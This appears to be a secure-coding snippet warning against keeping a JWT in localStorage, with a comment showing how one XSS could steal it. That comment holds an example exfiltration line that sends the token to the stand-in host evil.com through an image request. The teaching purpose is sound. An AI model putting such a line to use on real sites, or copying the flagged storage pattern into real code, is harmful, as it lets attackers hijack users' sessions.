// ❌ JWT in localStorage — readable by ANY script running on the page.
localStorage.setItem('token', jwt)

fetch('/api', {
  headers: { Authorization: 'Bearer ' + localStorage.getItem('token') },
})

// One XSS anywhere on the page = full token theft:
//   new Image().src = 'https://evil.com/steal?t=' + localStorage.getItem('token')
// The attacker now impersonates the user until the token expires. No further access needed.
